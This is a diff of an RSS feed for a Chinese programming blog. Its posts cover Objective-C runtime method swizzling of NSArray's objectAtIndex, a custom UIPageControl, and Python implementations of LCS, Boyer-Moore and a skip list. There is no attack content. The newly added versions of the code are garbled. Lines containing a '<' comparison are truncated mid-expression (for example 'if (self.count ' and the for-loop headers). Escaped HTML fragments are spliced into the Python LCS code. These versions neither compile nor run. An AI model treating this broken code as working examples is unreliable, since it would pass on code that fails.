@@ -5,8 +5,8 @@
         <description>Snorlax's blog - Xinzheng Zhang</description>
         <link>http://snorlaxzxz.com</link>
         <link>http://snorlaxzxz.com</link>
-        <lastBuildDate>2014-05-27T12:17:26+08:00</lastBuildDate>
-        <pubDate>2014-05-27T12:17:26+08:00</pubDate>
+        <lastBuildDate>2014-05-27T14:58:06+08:00</lastBuildDate>
+        <pubDate>2014-05-27T14:58:06+08:00</pubDate>
         <ttl>1800</ttl>
 
 
@@ -209,31 +209,36 @@
 
         <item>
                 <title>ios替换系统方法</title>
-                <description>&lt;p&gt;作为动态语言的oc我以前一直忽视了他的动态特性最近一个分享会才突然就有种飘逸的感觉&lt;br /&gt;
-主要使用的就是oc的runtime特性&lt;br /&gt;
-#import &quot;objc/runtime.h&quot;&lt;br /&gt;
-引入这个头文件之后才发现动态远远不止我以前想的那么简单引入这个头文件后可以发现者真是海量的api能让代码写的真是自己都不认识都不过分&lt;br /&gt;
+                <description>&lt;p&gt;&lt;p&gt;作为动态语言的oc我以前一直忽视了他的动态特性最近一个分享会才突然就有种飘逸的感觉&lt;br /&gt;
+主要使用的就是oc的runtime特性&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1&gt;import &amp;quot;objc/runtime.h&amp;quot;&lt;br /&gt;&lt;/h1&gt;
+
+&lt;p&gt;引入这个头文件之后才发现动态远远不止我以前想的那么简单引入这个头文件后可以发现者真是海量的api能让代码写的真是自己都不认识都不过分&lt;br /&gt;
 然后就写一个例子来试验了&lt;br /&gt;
 比如 NSArray 里面的objetAtIndex 方法我想这个方法真是被无数人深恶痛绝……多少crash都是从这里搞出来的啊那么其实通过runtime完全可以重写这个方法、当然绝对不仅仅是简单的给他封一层那么简单&lt;br /&gt;
-首先你先需要找到这个方法是在哪儿的、最简单的方法就是故意越界让他报次错看看嘛Terminating app due to uncaught exception &#39;NSRangeException&#39;, reason: &#39;*** -[__NSArrayI objectAtIndex:]&lt;br /&gt;
+首先你先需要找到这个方法是在哪儿的、最简单的方法就是故意越界让他报次错看看嘛Terminating app due to uncaught exception &amp;#39;NSRangeException&amp;#39;, reason: &amp;#39;*** -[__NSArrayI objectAtIndex:]&lt;br /&gt;
 看到了吧就是 _NSArrayI里&lt;br /&gt;
-然后需要做的就是很简单了
-&lt;pre lang=&quot;objective-c&quot;&gt;
-Method method_ObjectAtIndex = class_getInstanceMethod(NSClassFromString(@&quot;__NSArrayI&quot;),@selector(objectAtIndex:));
-Method method_SafeObjectAtIndex = class_getInstanceMethod(NSClassFromString(@&quot;NSArray&quot;),@selector(safeObjectAtIndex:));//这个方法就是一会自己写的拓展进nsarray中的
-method_exchangeImplementations(method_ObjectAtIndex, method_SafeObjectAtIndex);//然后交换就是这么简单 不过这个危险性也是极大的比如整个系统所有的调用这个原生api的调用就全都走到你这来了、必须必须要确保正确性……&lt;/pre&gt;&lt;/p&gt;
+然后需要做的就是很简单了&lt;/p&gt;
 
-&lt;p&gt;//然后就简单的加个category的实现就好了&lt;br /&gt;
-@implementation NSArray(SafeExtenstion)&lt;br /&gt;
-- (id)safeObjectAtIndex:(NSUInteger)index&lt;br /&gt;
+&lt;p&gt;Method method_ObjectAtIndex = class_getInstanceMethod(NSClassFromString(@&amp;quot;_&lt;em&gt;NSArrayI&amp;quot;),@selector(objectAtIndex:));
+Method method_SafeObjectAtIndex = class_getInstanceMethod(NSClassFromString(@&amp;quot;NSArray&amp;quot;),@selector(safeObjectAtIndex:));//这个方法就是一会自己写的拓展进nsarray中的
+method_exchangeImplementations(method&lt;/em&gt;ObjectAtIndex, method_SafeObjectAtIndex);//然后交换就是这么简单 不过这个危险性也是极大的比如整个系统所有的调用这个原生api的调用就全都走到你这来了、必须必须要确保正确性……&lt;/p&gt;
+
+&lt;p&gt;//然后就简单的加个category的实现就好了
+@implementation NSArray(SafeExtenstion)
+- (id)safeObjectAtIndex:(NSUInteger)index
 {
-    NSLog(@&quot;wake %@--%@&quot;,NSStringFromSelector(_cmd),self);&lt;br /&gt;
-    if (self.count &lt;= index) return nil;&lt;br /&gt;
-    return [self safeObjectAtIndex:index];&lt;br /&gt;
+    NSLog(@&amp;quot;wake %@--%@&amp;quot;,NSStringFromSelector(_cmd),self);
+    if (self.count 
+    return [self safeObjectAtIndex:index];
 }
-@end
+@end&lt;/p&gt;
 
-这样就可以自己去复写掉一些认为系统实现的很傻逼的方法了吧、runtime的适用场景我想还远远不止这些呢&lt;/p&gt;
+&lt;p&gt;这样就可以自己去复写掉一些认为系统实现的很傻逼的方法了吧、runtime的适用场景我想还远远不止这些呢&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;/blockquote&gt;
 </description>
                 <link>http://snorlaxzxz.com/program/2013/07/29/ios%E6%9B%BF%E6%8D%A2%E7%B3%BB%E7%BB%9F%E6%96%B9%E6%B3%95</link>
                 <guid>http://snorlaxzxz.com/program/2013/07/29/ios替换系统方法</guid>
@@ -242,154 +247,153 @@ method_exchangeImplementations(method_ObjectAtIndex, method_SafeObjectAtIndex);/
 
         <item>
                 <title>定制 UIPageControl</title>
-                <description>&lt;p&gt;pagecontrol 就是iphone上面比如scrollview翻图片时候下面那个小点点&lt;br /&gt;
+                <description>&lt;p&gt;&lt;p&gt;pagecontrol 就是iphone上面比如scrollview翻图片时候下面那个小点点&lt;br /&gt;
 其实我个人觉得还是挺美观的……可是需求就是要自己的图片替掉……然后死人苹果又不给api、所以也就只能自己复写实现了&lt;br /&gt;
-先说下ios7之前 那些点点的实现非常简单 就是UIPageControl.subviews 就是一个个点的UIImageView 所以只需简单的替换掉就好了代码如下
-&lt;pre lang=&quot;c&quot;&gt;
-@property(nonatomic,strong)UIImage *_activeImage;
+先说下ios7之前 那些点点的实现非常简单 就是UIPageControl.subviews 就是一个个点的UIImageView 所以只需简单的替换掉就好了代码如下&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;@property(nonatomic,strong)UIImage *_activeImage;
 @property(nonatomic,strong)UIImage *_inactiveImage;
 //在init的时候把你自己定义的两张图片搞进去
 - (void)updateDots
 {
-    for (int i = 0; i&lt; [self.subviews count]; i++) {
-        UIImageView* dot =[self.subviews objectAtIndex:i];&lt;/pre&gt;&lt;/p&gt;
+    for (int i = 0; i
 
-&lt;p&gt;        if (i == self.currentPage) {&lt;br /&gt;
-            if ([dot respondsToSelector:@selector(setImage:)]) {&lt;br /&gt;
-                dot.image=_activeImage;&lt;br /&gt;
-            }&lt;/p&gt;
+        if (i == self.currentPage) {
+            if ([dot respondsToSelector:@selector(setImage:)]) {
+                dot.image=_activeImage;
+            }
 
-&lt;p&gt;        } else {&lt;br /&gt;
-            if ([dot respondsToSelector:@selector(setImage:)]) {&lt;br /&gt;
-                dot.image=_inactiveImage;&lt;br /&gt;
-            }&lt;br /&gt;
-        }&lt;br /&gt;
-    }&lt;br /&gt;
+        } else {
+            if ([dot respondsToSelector:@selector(setImage:)]) {
+                dot.image=_inactiveImage;
+            }
+        }
+    }
 }
-//然后自己重载一下setNumber就好了&lt;/p&gt;
+//然后自己重载一下setNumber就好了
 
-&lt;p&gt;- (void)setNumberOfPages:(NSInteger)numberOfPages&lt;br /&gt;
+- (void)setNumberOfPages:(NSInteger)numberOfPages
 {
-    [super setNumberOfPages:numberOfPages];&lt;br /&gt;
-    [self updateDots];&lt;br /&gt;
+    [super setNumberOfPages:numberOfPages];
+    [self updateDots];
 }
 
-但是呢万恶的ios7改掉了尼玛……连底层实现都改啊混蛋……可以对self.subviews 标红一下就明白了……整个pagecontrol的uivew乱七八糟……而且都是view根本就没了image属性、换句话说现在的那些小点点都是代码写出来的了、而不是简单图了&lt;br /&gt;
+但是呢万恶的ios7改掉了尼玛……连底层实现都改啊混蛋……可以对self.subviews 标红一下就明白了……整个pagecontrol的uivew乱七八糟……而且都是view根本就没了image属性、换句话说现在的那些小点点都是代码写出来的了、而不是简单图了
 实现起来就要重写UIView的绘画函数了代码大致如下
-&lt;pre lang=&quot;c&quot;&gt;
-#import &quot;ZDPageControll.h&quot;
-#import &lt;QuartzCore/QuartzCore.h&gt;&lt;/pre&gt;&lt;/p&gt;
 
-&lt;p&gt;@interface ZDPageControll()&lt;br /&gt;
+#import &amp;quot;ZDPageControll.h&amp;quot;
+#import 
+
+@interface ZDPageControll()
 {
-    UIImage *_activeImage;&lt;br /&gt;
-    UIImage *_inactiveImage;&lt;br /&gt;
-    NSArray *_usedToRetainOriginalSubview;&lt;br /&gt;
-}&lt;/p&gt;
-
-&lt;p&gt;@end&lt;/p&gt;
-
-&lt;p&gt;@implementation ZDPageControll&lt;br /&gt;
-@synthesize kSpacing=_kSpacing;&lt;br /&gt;
-- (id)initWithFrame:(CGRect)frame currentImageName:(NSString *)current commonImageName:(NSString *)common&lt;br /&gt;
-{
-    self= [super initWithFrame:frame];&lt;br /&gt;
-    if ([self respondsToSelector:@selector(setCurrentPageIndicatorTintColor:)] &amp;&amp; [self respondsToSelector:@selector(setPageIndicatorTintColor:)]) {&lt;br /&gt;
-        [self setCurrentPageIndicatorTintColor:[UIColor clearColor]];&lt;br /&gt;
-        [self setPageIndicatorTintColor:[UIColor clearColor]];&lt;br /&gt;
-    }&lt;br /&gt;
-    &lt;br /&gt;
-    [self setBackgroundColor:[UIColor clearColor]];&lt;br /&gt;
-    _activeImage= [UIImage imageNamed:current];&lt;br /&gt;
-    _inactiveImage= [UIImage imageNamed:common];&lt;br /&gt;
-    _kSpacing=10.0f;&lt;br /&gt;
-    //hold住原来pagecontroll的subview&lt;br /&gt;
-    _usedToRetainOriginalSubview=[NSArray arrayWithArray:self.subviews];&lt;br /&gt;
-    for (UIView *su in self.subviews) {&lt;br /&gt;
-        [su removeFromSuperview];&lt;br /&gt;
-    }&lt;br /&gt;
-    self.contentMode=UIViewContentModeRedraw;&lt;br /&gt;
-    return self;&lt;br /&gt;
+    UIImage *_activeImage;
+    UIImage *_inactiveImage;
+    NSArray *_usedToRetainOriginalSubview;
 }
--(void)dealloc&lt;br /&gt;
+
+@end
+
+@implementation ZDPageControll
+@synthesize kSpacing=_kSpacing;
+- (id)initWithFrame:(CGRect)frame currentImageName:(NSString *)current commonImageName:(NSString *)common
 {
-    //释放原来hold住的那些subview&lt;br /&gt;
-    _usedToRetainOriginalSubview=nil;&lt;br /&gt;
-    _activeImage=nil;&lt;br /&gt;
-    _inactiveImage=nil;&lt;br /&gt;
+    self= [super initWithFrame:frame];
+    if ([self respondsToSelector:@selector(setCurrentPageIndicatorTintColor:)] &amp;amp;&amp;amp; [self respondsToSelector:@selector(setPageIndicatorTintColor:)]) {
+        [self setCurrentPageIndicatorTintColor:[UIColor clearColor]];
+        [self setPageIndicatorTintColor:[UIColor clearColor]];
+    }
+
+    [self setBackgroundColor:[UIColor clearColor]];
+    _activeImage= [UIImage imageNamed:current];
+    _inactiveImage= [UIImage imageNamed:common];
+    _kSpacing=10.0f;
+    //hold住原来pagecontroll的subview
+    _usedToRetainOriginalSubview=[NSArray arrayWithArray:self.subviews];
+    for (UIView *su in self.subviews) {
+        [su removeFromSuperview];
+    }
+    self.contentMode=UIViewContentModeRedraw;
+    return self;
 }
-- (void)updateDots&lt;br /&gt;
-{&lt;/p&gt;
-
-&lt;p&gt;    for (int i = 0; i&lt; [self.subviews count]; i++) {&lt;br /&gt;
-        UIImageView* dot =[self.subviews objectAtIndex:i];&lt;/p&gt;
-
-&lt;p&gt;        if (i == self.currentPage) {&lt;br /&gt;
-            if ([dot respondsToSelector:@selector(setImage:)]) {&lt;br /&gt;
-                dot.image=_activeImage;&lt;br /&gt;
-            }&lt;/p&gt;
-
-&lt;p&gt;        } else {&lt;br /&gt;
-            if ([dot respondsToSelector:@selector(setImage:)]) {&lt;br /&gt;
-                dot.image=_inactiveImage;&lt;br /&gt;
-            }&lt;br /&gt;
-        }&lt;br /&gt;
-    }&lt;/p&gt;
-
-&lt;p&gt;}&lt;/p&gt;
-
-&lt;p&gt;- (void)setCurrentPage:(NSInteger)currentPage&lt;br /&gt;
+-(void)dealloc
 {
-    [super setCurrentPage:currentPage];&lt;br /&gt;
-    if ([[[UIDevice currentDevice]systemVersion]floatValue] &lt;=6.0) {&lt;br /&gt;
-        [self updateDots];&lt;br /&gt;
-    }&lt;br /&gt;
-//    [self updateDots];&lt;br /&gt;
-    [self setNeedsDisplay];&lt;br /&gt;
+    //释放原来hold住的那些subview
+    _usedToRetainOriginalSubview=nil;
+    _activeImage=nil;
+    _inactiveImage=nil;
 }
-- (void)setNumberOfPages:(NSInteger)numberOfPages&lt;br /&gt;
+- (void)updateDots
 {
-    [super setNumberOfPages:numberOfPages];&lt;br /&gt;
-    if ([[[UIDevice currentDevice]systemVersion]floatValue] &lt;=6.0) {&lt;br /&gt;
-        [self updateDots];&lt;br /&gt;
-    }&lt;br /&gt;
-//    [self updateDots];&lt;br /&gt;
-    [self setNeedsDisplay];&lt;/p&gt;
 
-&lt;p&gt;}&lt;br /&gt;
--(void)drawRect:(CGRect)iRect&lt;br /&gt;
-{
-    int i;&lt;br /&gt;
-    CGRect rect;&lt;br /&gt;
-    &lt;br /&gt;
-    UIImage *image;&lt;br /&gt;
-    iRect = self.bounds;&lt;br /&gt;
-    &lt;br /&gt;
-    if ( self.opaque ) {&lt;br /&gt;
-        [self.backgroundColor set];&lt;br /&gt;
-        UIRectFill( iRect );&lt;br /&gt;
-    }&lt;br /&gt;
-    &lt;br /&gt;
-    if ( self.hidesForSinglePage &amp;&amp; self.numberOfPages == 1 ) return;&lt;br /&gt;
-    &lt;br /&gt;
-    rect.size.height = _activeImage.size.height;&lt;br /&gt;
-    rect.size.width = self.numberOfPages * _activeImage.size.width + ( self.numberOfPages - 1 ) * _kSpacing;&lt;br /&gt;
-    rect.origin.x = floorf( ( iRect.size.width - rect.size.width ) / 2.0 );&lt;br /&gt;
-    rect.origin.y = floorf( ( iRect.size.height - rect.size.height ) / 2.0 );&lt;br /&gt;
-    rect.size.width = _activeImage.size.width;&lt;br /&gt;
-    &lt;br /&gt;
-    for ( i = 0; i &lt; self.numberOfPages; ++i ) {&lt;br /&gt;
-        image = i == self.currentPage ? _activeImage : _inactiveImage;&lt;br /&gt;
-        &lt;br /&gt;
-        [image drawInRect: rect];&lt;br /&gt;
-        &lt;br /&gt;
-        rect.origin.x += _activeImage.size.width + _kSpacing;&lt;br /&gt;
-    }&lt;br /&gt;
+    for (int i = 0; i
+        UIImageView* dot =[self.subviews objectAtIndex:i];
+
+        if (i == self.currentPage) {
+            if ([dot respondsToSelector:@selector(setImage:)]) {
+                dot.image=_activeImage;
+            }
+
+        } else {
+            if ([dot respondsToSelector:@selector(setImage:)]) {
+                dot.image=_inactiveImage;
+            }
+        }
+    }
+
 }
-@end&lt;/p&gt;
 
-&lt;p&gt;&lt;/p&gt;
-</description>
+- (void)setCurrentPage:(NSInteger)currentPage
+{
+    [super setCurrentPage:currentPage];
+    if ([[[UIDevice currentDevice]systemVersion]floatValue] 
+        [self updateDots];
+    }
+//    [self updateDots];
+    [self setNeedsDisplay];
+}
+- (void)setNumberOfPages:(NSInteger)numberOfPages
+{
+    [super setNumberOfPages:numberOfPages];
+    if ([[[UIDevice currentDevice]systemVersion]floatValue] 
+        [self updateDots];
+    }
+//    [self updateDots];
+    [self setNeedsDisplay];
+
+}
+-(void)drawRect:(CGRect)iRect
+{
+    int i;
+    CGRect rect;
+
+    UIImage *image;
+    iRect = self.bounds;
+
+    if ( self.opaque ) {
+        [self.backgroundColor set];
+        UIRectFill( iRect );
+    }
+
+    if ( self.hidesForSinglePage &amp;amp;&amp;amp; self.numberOfPages == 1 ) return;
+
+    rect.size.height = _activeImage.size.height;
+    rect.size.width = self.numberOfPages * _activeImage.size.width + ( self.numberOfPages - 1 ) * _kSpacing;
+    rect.origin.x = floorf( ( iRect.size.width - rect.size.width ) / 2.0 );
+    rect.origin.y = floorf( ( iRect.size.height - rect.size.height ) / 2.0 );
+    rect.size.width = _activeImage.size.width;
+
+    for ( i = 0; i 
+        image = i == self.currentPage ? _activeImage : _inactiveImage;
+
+        [image drawInRect: rect];
+
+        rect.origin.x += _activeImage.size.width + _kSpacing;
+    }
+}
+@end
+
+
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2013/06/24/%E5%AE%9A%E5%88%B6-uipagecontrol</link>
                 <guid>http://snorlaxzxz.com/program/2013/06/24/定制-uipagecontrol</guid>
                 <pubDate>2013-06-24T00:00:00+08:00</pubDate>
@@ -400,61 +404,60 @@ method_exchangeImplementations(method_ObjectAtIndex, method_SafeObjectAtIndex);/
                 <description>&lt;p&gt;mit 算法导论公开课 15集&lt;br /&gt;
 http://v.163.com/movie/2010/12/L/4/M6UTT5U0I_M6V2U1HL4.html&lt;/p&gt;
 
-&lt;p&gt;实现了求出所有的lcs
-&lt;pre lang=&quot;python&quot;&gt;
-import copy
+&lt;p&gt;实现了求出所有的lcs&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;import copy
 import sys
-#stringa=&quot;abcbdab&quot;
-#stringb=&quot;bdcaba&quot;&lt;/pre&gt;&lt;/p&gt;
+#stringa=&amp;quot;abcbdab&amp;quot;
+#stringb=&amp;quot;bdcaba&amp;quot;
 
-&lt;p&gt;stringa=sys.argv[1]&lt;br /&gt;
-stringb=sys.argv[2]&lt;br /&gt;
-lena=len(stringa)&lt;br /&gt;
-lenb=len(stringb)&lt;/p&gt;
+stringa=sys.argv[1]
+stringb=sys.argv[2]
+lena=len(stringa)
+lenb=len(stringb)
 
-&lt;p&gt;mapl=[[0 for _ in xrange(lena+1)] for _ in xrange(lenb+1)]&lt;br /&gt;
-path=[]&lt;br /&gt;
-for i in xrange(1,lenb+1):&lt;br /&gt;
-	for j in xrange(1,lena+1):&lt;br /&gt;
-		if stringa[j-1]==stringb[i-1]:&lt;br /&gt;
-			mapl[i][j]=mapl[i-1][j-1]+1&lt;br /&gt;
-			path.append((i,j))&lt;br /&gt;
-		else:&lt;br /&gt;
-			mapl[i][j]=max(mapl[i-1][j],mapl[i][j-1])&lt;br /&gt;
-#for i in mapl:&lt;br /&gt;
-#	print i&lt;br /&gt;
-#print path&lt;br /&gt;
-if len(path)==0:&lt;br /&gt;
-	print &quot;no lcs&quot;&lt;br /&gt;
-else:&lt;br /&gt;
-	backdatestack=[[(lenb,lena),[]]]&lt;br /&gt;
-	while len(backdatestack)!=0:&lt;br /&gt;
-		top=backdatestack.pop()&lt;br /&gt;
-		ansstack=top[1]&lt;br /&gt;
-		lcs=mapl[top[0][0]][top[0][1]]&lt;br /&gt;
-		i=top[0][0]&lt;br /&gt;
-		j=top[0][1]&lt;br /&gt;
-		while lcs!=0:&lt;br /&gt;
-			try:&lt;br /&gt;
-				ind=path.index((i,j))&lt;br /&gt;
-				ansstack.append(stringb[i-1])&lt;br /&gt;
-				i-=1&lt;br /&gt;
-				j-=1&lt;br /&gt;
-				lcs-=1&lt;br /&gt;
-			except ValueError:&lt;br /&gt;
-				if mapl[i-1][j]&gt;mapl[i][j-1]:&lt;br /&gt;
-					i-=1&lt;br /&gt;
-				elif mapl[i-1][j]&lt;mapl[i][j-1]:&lt;br /&gt;
-					j-=1&lt;br /&gt;
-				else:&lt;br /&gt;
-					backdatestack.append([(i-1,j),copy.copy(ansstack)])&lt;br /&gt;
-					j-=1&lt;br /&gt;
-		while len(ansstack)!=0:&lt;br /&gt;
-			print ansstack.pop(),&lt;br /&gt;
-		print &lt;/p&gt;
+mapl=[[0 for _ in xrange(lena+1)] for _ in xrange(lenb+1)]
+path=[]
+for i in xrange(1,lenb+1):
+    for j in xrange(1,lena+1):
+        if stringa[j-1]==stringb[i-1]:
+            mapl[i][j]=mapl[i-1][j-1]+1
+            path.append((i,j))
+        else:
+            mapl[i][j]=max(mapl[i-1][j],mapl[i][j-1])
+#for i in mapl:
+#   print i
+#print path
+if len(path)==0:
+    print &amp;quot;no lcs&amp;quot;
+else:
+    backdatestack=[[(lenb,lena),[]]]
+    while len(backdatestack)!=0:
+        top=backdatestack.pop()
+        ansstack=top[1]
+        lcs=mapl[top[0][0]][top[0][1]]
+        i=top[0][0]
+        j=top[0][1]
+        while lcs!=0:
+            try:
+                ind=path.index((i,j))
+                ansstack.append(stringb[i-1])
+                i-=1
+                j-=1
+                lcs-=1
+            except ValueError:
+                if mapl[i-1][j]&amp;gt;&amp;gt;mapl[i][j-1]:&amp;lt;br /&amp;gt;
+                    i-=1&amp;lt;br /&amp;gt;
+                elif mapl[i-1][j]&amp;lt;mapl[i][j-1]:&amp;lt;br /&amp;gt;
+                    j-=1&amp;lt;br /&amp;gt;
+                else:&amp;lt;br /&amp;gt;
+                    backdatestack.append([(i-1,j),copy.copy(ansstack)])&amp;lt;br /&amp;gt;
+                    j-=1&amp;lt;br /&amp;gt;
+        while len(ansstack)!=0:&amp;lt;br /&amp;gt;
+            print ansstack.pop(),&amp;lt;br /&amp;gt;
+        print &amp;lt;/p&amp;gt;
 
-&lt;p&gt;&lt;/p&gt;
-</description>
+&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2013/05/08/%E6%9C%80%E5%A4%A7%E5%85%AC%E5%85%B1%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97lcs-python%E5%AE%9E%E7%8E%B0</link>
                 <guid>http://snorlaxzxz.com/program/2013/05/08/最大公共上升子序列lcs-python实现</guid>
                 <pubDate>2013-05-08T00:00:00+08:00</pubDate>
@@ -462,77 +465,77 @@ else:&lt;br /&gt;
 
         <item>
                 <title>Boyer-Moore算法 python实现</title>
-                <description>&lt;p&gt;看了&lt;a href=&quot;http://www.ruanyifeng.com/blog/2013/05/boyer-moore_string_search_algorithm.html?utm_source=feedly&quot;&gt;字符串匹配的Boyer-Moore算法&lt;/a&gt;后觉得很有用就写一个实现了一下
-&lt;pre lang=&quot;python&quot;&gt;
-def badcharrule(ori,sear):
-	if len(ori)!=len(sear):
-		print &quot;error&quot;
-	else:
-		le=len(ori)
-		badindex=-1
-		lastindex=-1
-		for i in xrange(le-1,0,-1):
-			if ori[i]==sear[i]:
-				pass
-			else:
-				badindex=i
-				break
-		if badindex==-1:
-			pass
-		else:
-			for i in xrange(0,le):
-				if sear[i]==ori[badindex]:
-					lastindex=i
-					break
-				else:
-					pass
-		return badindex-lastindex
+                <description>&lt;p&gt;&lt;p&gt;看了&lt;a href=&quot;http://www.ruanyifeng.com/blog/2013/05/boyer-moore_string_search_algorithm.html?utm_source=feedly&quot;&gt;字符串匹配的Boyer-Moore算法&lt;/a&gt;后觉得很有用就写一个实现了一下&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;def badcharrule(ori,sear):
+    if len(ori)!=len(sear):
+        print &amp;quot;error&amp;quot;
+    else:
+        le=len(ori)
+        badindex=-1
+        lastindex=-1
+        for i in xrange(le-1,0,-1):
+            if ori[i]==sear[i]:
+                pass
+            else:
+                badindex=i
+                break
+        if badindex==-1:
+            pass
+        else:
+            for i in xrange(0,le):
+                if sear[i]==ori[badindex]:
+                    lastindex=i
+                    break
+                else:
+                    pass
+        return badindex-lastindex
 def goodpostfixrule(ori,sear):
-	if len(ori)!=len(sear):
-		print &quot;error&quot;
-	else:
-		le=len(ori)
-		postfix=0
-		for i in xrange(le-1,0,-1):
-			if ori[i]==sear[i]:
-				postfix+=1
-			else:
-				break
-		if postfix==0:
-			return -1
-		else:
-			postfixstring=sear[-postfix:]
-			restori=sear[:-postfix]
-			if restori.find(postfixstring)==-1:
-				restori=postfixstring[:-1]+restori
-				if restori.find(postfixstring)==-1:
-					return -1
-				else:
-					return len(sear)-restori.find(postfixstring)-1
-			else:
-				return len(sear)-restori.find(postfixstring)-len(postfixstring)&lt;/pre&gt;&lt;/p&gt;
+    if len(ori)!=len(sear):
+        print &amp;quot;error&amp;quot;
+    else:
+        le=len(ori)
+        postfix=0
+        for i in xrange(le-1,0,-1):
+            if ori[i]==sear[i]:
+                postfix+=1
+            else:
+                break
+        if postfix==0:
+            return -1
+        else:
+            postfixstring=sear[-postfix:]
+            restori=sear[:-postfix]
+            if restori.find(postfixstring)==-1:
+                restori=postfixstring[:-1]+restori
+                if restori.find(postfixstring)==-1:
+                    return -1
+                else:
+                    return len(sear)-restori.find(postfixstring)-1
+            else:
+                return len(sear)-restori.find(postfixstring)-len(postfixstring)
 
-&lt;p&gt;def movestep(ori,sear):&lt;br /&gt;
-	gu=badcharrule(ori,sear)&lt;br /&gt;
-	if gu==0:&lt;br /&gt;
-		return 0&lt;br /&gt;
-	else:&lt;br /&gt;
-		return max(gu,goodpostfixrule(ori,sear))&lt;/p&gt;
+def movestep(ori,sear):
+    gu=badcharrule(ori,sear)
+    if gu==0:
+        return 0
+    else:
+        return max(gu,goodpostfixrule(ori,sear))
 
-&lt;p&gt;oristring=&quot;here is a simple example&quot;&lt;br /&gt;
-searchstring=&quot;example&quot;&lt;/p&gt;
+oristring=&amp;quot;here is a simple example&amp;quot;
+searchstring=&amp;quot;example&amp;quot;
 
-&lt;p&gt;index=0&lt;br /&gt;
-while index+len(searchstring)&lt;=len(oristring):&lt;br /&gt;
-	move=movestep(oristring[index:index+len(searchstring)],searchstring)&lt;br /&gt;
-	if move==0:&lt;br /&gt;
-		print &quot;find it index=%s&quot; %index&lt;br /&gt;
-		index+=len(searchstring)&lt;br /&gt;
-	else:&lt;br /&gt;
-		index+=move&lt;br /&gt;
-print &quot;search over&quot;
-&lt;/p&gt;
-</description>
+index=0
+while index+len(searchstring)
+    move=movestep(oristring[index:index+len(searchstring)],searchstring)
+    if move==0:
+        print &amp;quot;find it index=%s&amp;quot; %index
+        index+=len(searchstring)
+    else:
+        index+=move
+print &amp;quot;search over&amp;quot;
+
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2013/05/06/boyer-moore%E7%AE%97%E6%B3%95-python%E5%AE%9E%E7%8E%B0</link>
                 <guid>http://snorlaxzxz.com/program/2013/05/06/boyer-moore算法-python实现</guid>
                 <pubDate>2013-05-06T00:00:00+08:00</pubDate>
@@ -544,151 +547,152 @@ print &quot;search over&quot;
 详细介绍可看网易公开课算法导论第12集跳跃表&lt;br /&gt;
 http://v.163.com/special/opencourse/algorithms.html&lt;/p&gt;
 
-&lt;p&gt;然后把代码贴上
-&lt;pre lang=&quot;python&quot;&gt;import sys
+&lt;p&gt;&lt;p&gt;然后把代码贴上&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;import sys
 import random
 mineast=-sys.maxint
 class Node(object):
-	def __init__(self,value=mineast,rightp=None,leftp=None,upp=None,downp=None):
-		self.value=value
-		self.rightp=rightp
-		self.leftp=leftp
-		self.upp=upp
-		self.downp=downp
-	def __del__(self):
-		self.value=None
-		self.rightp=None
-		self.leftp=None
-		self.upp=None
-		self.downp=None
+    def __init__(self,value=mineast,rightp=None,leftp=None,upp=None,downp=None):
+        self.value=value
+        self.rightp=rightp
+        self.leftp=leftp
+        self.upp=upp
+        self.downp=downp
+    def __del__(self):
+        self.value=None
+        self.rightp=None
+        self.leftp=None
+        self.upp=None
+        self.downp=None
 class skipTable(object):
-	def __init__(self):
-		self.lefthead=Node()
-	def __del__(self):
-		t=self.lefthead
-		headlist=[]
-		while t:
-			headlist.append(t)
-			t=t.downp
-		for i in headlist:
-			while i:
-				dd=i
-				i=i.rightp
-				del(dd)&lt;/pre&gt;&lt;/p&gt;
+    def __init__(self):
+        self.lefthead=Node()
+    def __del__(self):
+        t=self.lefthead
+        headlist=[]
+        while t:
+            headlist.append(t)
+            t=t.downp
+        for i in headlist:
+            while i:
+                dd=i
+                i=i.rightp
+                del(dd)
 
-&lt;p&gt;	def findlowestLayer(self,newvalue):&lt;br /&gt;
-		tmphead=self.lefthead&lt;br /&gt;
-		tmpans=[]&lt;br /&gt;
-		while tmphead.downp:&lt;br /&gt;
-			while tmphead.rightp:&lt;br /&gt;
-				if tmphead.rightp.value&amp;gt;newvalue:&lt;br /&gt;
-					break&lt;br /&gt;
-				else:&lt;br /&gt;
-					tmphead=tmphead.rightp&lt;br /&gt;
-			tmpans.append(tmphead)&lt;br /&gt;
-			tmphead=tmphead.downp&lt;br /&gt;
-		tmpans.append(tmphead)&lt;br /&gt;
-		return tmpans&lt;br /&gt;
-	def getCurrentLayerInsertLoc(self,Head,newvalue):&lt;br /&gt;
-		tmphead=Head&lt;br /&gt;
-		while(tmphead.rightp):&lt;br /&gt;
-			if tmphead.rightp.value&amp;gt;newvalue:&lt;br /&gt;
-				return tmphead&lt;br /&gt;
-			else:&lt;br /&gt;
-				tmphead=tmphead.rightp&lt;br /&gt;
-		return tmphead&lt;br /&gt;
-	def randomup(self):&lt;br /&gt;
-		if random.randint(0,1)==0:&lt;br /&gt;
-			return False&lt;br /&gt;
-		else:&lt;br /&gt;
-			return True&lt;br /&gt;
-	def adjustnode(self,prefixNode,value):&lt;br /&gt;
-		newnode=Node(value,prefixNode.rightp,prefixNode,None,None)&lt;br /&gt;
-		if prefixNode.rightp:&lt;br /&gt;
-			prefixNode.rightp.leftp=newnode&lt;br /&gt;
-			prefixNode.rightp=newnode&lt;br /&gt;
-		else:&lt;br /&gt;
-			prefixNode.rightp=newnode&lt;br /&gt;
-		return newnode&lt;br /&gt;
